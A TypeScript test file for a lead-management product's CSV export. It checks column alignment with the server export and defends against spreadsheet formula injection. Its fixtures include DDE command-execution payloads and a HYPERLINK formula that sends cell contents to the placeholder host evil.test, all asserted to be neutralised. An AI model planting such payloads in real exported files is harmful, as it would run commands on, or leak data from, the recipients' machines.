/**
 * The CSV is the only place a lead leaves the product, so it is the one view
 * where a dropped field is unrecoverable: a sheet built from an export that
 * lost the resolved company cannot get it back without exporting again.
 *
 * These tests pin two things. The columns line up with `GET /leads/export`, so
 * a customer who downloads both files can merge them — they used to disagree on
 * their columns and on their date format, with nothing on screen saying so. And
 * every untrusted cell is defused against spreadsheet formula injection.
 */
import { describe, expect, it } from 'vitest';

import { type Lead } from '../../types/domain';

import { LOCAL_TAGS_COLUMN, buildSelectedLeadsCsv } from './leadsCsv';
import { UNKNOWN_LOCATION, formatLocation } from './leadModel';

const noTags = () => [] as readonly string[];

/** Column positions, mirroring `lead_routes.export_leads`. */
const COLUMN = {
  sessionId: 0,
  name: 1,
  email: 2,
  phone: 3,
  company: 4,
  score: 5,
  status: 6,
  location: 11,
  device: 12,
  messages: 13,
  created: 14,
  lastActive: 15,
  companyName: 16,
  tags: 17,
} as const;

function lead(overrides: Partial<Lead> = {}, contact: Partial<NonNullable<Lead['contact']>> = {}): Lead {
  return {
    session_id: 's1',
    tier: 'unqualified',
    status: 'unqualified',
    score: 10,
    contact: { name: 'Priya', email: 'priya@infosys.com', ...contact },
    ...overrides,
  } as Lead;
}

function cells(csv: string, row: number): string[] {
  return csv.split('\r\n')[row].split(',');
}

function unquote(cell: string): string {
  return cell.replace(/^"|"$/g, '').replace(/""/g, '"');
}

describe('buildSelectedLeadsCsv — columns', () => {
  it('emits the server export\'s columns in the server\'s order', () => {
    const header = cells(buildSelectedLeadsCsv([lead()], noTags), 0).map(unquote);
    expect(header.slice(0, 16)).toEqual([
      'Session ID',
      'Name',
      'Email',
      'Phone',
      'Company',
      'Score',
      'Status',
      'Need',
      'Budget',
      'Authority',
      'Timeline',
      'Location',
      'Device',
      'Messages',
      'Created',
      'Last Active',
    ]);
  });

  it('names the two columns the server cannot produce', () => {
    // The tags column carries the word "browser" because the data has never
    // left this machine. A column headed plain "Tags" in a file that gets
    // mailed around reads as workspace data every teammate also has.
    const header = cells(buildSelectedLeadsCsv([lead()], noTags), 0).map(unquote);
    expect(header[COLUMN.companyName]).toBe('Company name');
    expect(header[COLUMN.tags]).toBe(LOCAL_TAGS_COLUMN);
  });

  it('keeps the raw domain in Company and the resolved name in its own column', () => {
    // Substituting one for the other would break any sheet keyed on the domain,
    // and the server writes the domain there.
    const csv = buildSelectedLeadsCsv(
      [lead({}, { company: 'infosys.com', company_name: 'Infosys Limited' })],
      noTags,
    );
    const row = cells(csv, 1).map(unquote);
    expect(row[COLUMN.company]).toBe('infosys.com');
    expect(row[COLUMN.companyName]).toBe('Infosys Limited');
  });

  it('leaves both company columns empty for a personal address', () => {
    const row = cells(buildSelectedLeadsCsv([lead()], noTags), 1).map(unquote);
    expect(row[COLUMN.company]).toBe('');
    expect(row[COLUMN.companyName]).toBe('');
  });

  it('writes timestamps as ISO, like the server export', () => {
    // The two downloads formatted the same instant two ways — one ISO, one
    // "Jul 21, 3:04 PM" — so merging them put a text column beside a date one.
    const csv = buildSelectedLeadsCsv([lead({ last_active_at: '2026-08-13T10:00:00Z' })], noTags);
    expect(unquote(cells(csv, 1)[COLUMN.lastActive])).toBe('2026-08-13T10:00:00.000Z');
  });

  it('leaves the score and status empty when the plan does not include them', () => {
    // The server deletes these keys for Free rather than nulling them, so a
    // zero here would be a claim the API never made.
    const free = { session_id: 's9', contact: null } as unknown as Lead;
    const row = cells(buildSelectedLeadsCsv([free], noTags), 1).map(unquote);
    expect(row[COLUMN.score]).toBe('');
    expect(row[COLUMN.status]).toBe('');
  });

  it('exports an unresolved location as an empty cell, matching the server', () => {
    // `formatLocation` answers the word "Unknown", which is right for a table
    // cell and wrong for a file: a CRM importing it creates that country.
    expect(formatLocation(null)).toBe(UNKNOWN_LOCATION);
    const csv = buildSelectedLeadsCsv([lead()], noTags);
    expect(csv).not.toContain(UNKNOWN_LOCATION);
    expect(unquote(cells(csv, 1)[COLUMN.location])).toBe('');
  });

  it('keeps a real place and still drops the IP the stored value carries', () => {
    const csv = buildSelectedLeadsCsv([lead({ location: 'Pune | 49.36.1.2' })], noTags);
    expect(unquote(cells(csv, 1)[COLUMN.location])).toBe('Pune');
    expect(csv).not.toContain('49.36.1.2');
  });
});

/**
 * CSV injection.
 *
 * The escape itself is unit-tested in `lib/csvSafe.test.ts`. These prove it is
 * wired into the file the customer actually downloads. RFC-4180 quoting does
 * NOT cover this — Excel evaluates `"=1+1"` exactly as it evaluates `=1+1` — so
 * a cell that merely round-trips through a parser proves nothing. Every
 * assertion below is on the leading character of the unquoted cell.
 */
describe('buildSelectedLeadsCsv — formula injection', () => {
  const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

  it('neutralises a payload in every untrusted column', () => {
    // A sweep rather than one test per column, so a column added later without
    // the escape fails here — the failure mode the defence exists to prevent.
    const csv = buildSelectedLeadsCsv(
      [
        lead(
          { location: '=cmd|\' /C calc\'!A0', device: '@device', last_active_at: '2026-08-13T10:00:00Z' },
          {
            name: '=HYPERLINK("https://evil.test/?"&A2,"Click")',
            email: "@SUM(1+1)*cmd|' /C calc'!A0",
            phone: '-2+3+cmd|" /C calc"!A0',
            company: '+evil.test',
            company_name: '=1+1',
          },
        ),
      ],
      () => ['@SUM(1+1)'] as readonly string[],
    );

    for (const line of csv.split('\r\n')) {
      for (const cell of line.split('","')) {
        expect(TRIGGERS.some((trigger) => unquote(cell).startsWith(trigger))).toBe(false);
      }
    }

    // Defused, not dropped: each payload survives verbatim behind its quote.
    const row = csv.split('\r\n')[1];
    expect(row).toContain('\'=HYPERLINK(""https://evil.test/?""&A2,""Click"")');
    expect(row).toContain("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(row).toContain('\'-2+3+cmd|"" /C calc""!A0');
    expect(row).toContain("'+evil.test");
    expect(row).toContain("'=1+1");
  });

  it('neutralises a payload in an operator-typed tag', () => {
    const csv = buildSelectedLeadsCsv([lead()], () => ['=1+1', 'warm'] as readonly string[]);
    expect(csv.split('\r\n')[1]).toContain("'=1+1; warm");
  });

  it('leaves ordinary values alone', () => {
    // The email matters most: the trigger is a *leading* '@', so
    // `priya@infosys.com` has to survive intact.
    const csv = buildSelectedLeadsCsv([lead({}, { company: 'infosys.com' })], noTags);
    const row = csv.split('\r\n')[1];
    expect(row).toContain('"Priya"');
    expect(row).toContain('"priya@infosys.com"');
    expect(row).toContain('"infosys.com"');
    expect(row).not.toContain("'");
  });

  it("escapes an E.164 phone number, and that is intended", () => {
    // Pinned so nobody "fixes" it later, and matched to `csv_safe` on the
    // backend: '+91 …' starts with '+' and picks up a quote like any other
    // triggering cell. Exempting values that "look like" a phone number is not
    // an option — '+1+1' looks exactly as numeric as '+91'.
    const csv = buildSelectedLeadsCsv([lead({}, { phone: '+91 98000 00000' })], noTags);
    expect(csv.split('\r\n')[1]).toContain("\"'+91 98000 00000\"");
  });
});
